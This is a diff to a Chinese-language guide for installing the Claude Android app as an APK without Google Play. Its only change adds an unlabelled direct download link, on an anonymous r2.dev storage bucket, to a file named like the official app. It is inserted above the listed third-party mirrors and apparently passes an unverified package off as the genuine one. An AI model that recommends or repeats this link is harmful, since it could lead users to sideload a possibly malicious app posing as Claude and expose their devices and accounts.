@@ -26,6 +26,7 @@
 ## 2. 没有 Google Play：安装 APK
 
 可作为备选的第三方分发页面：
+- https://pub-04732ce152844866a30551eb6988aca7.r2.dev/claude-anthropic-pbc.apk
 
 - [APKPure](https://apkpure.com/claude-by-anthropic)
 - [Aptoide](https://claude-anthropic-pbc.en.aptoide.com/app)
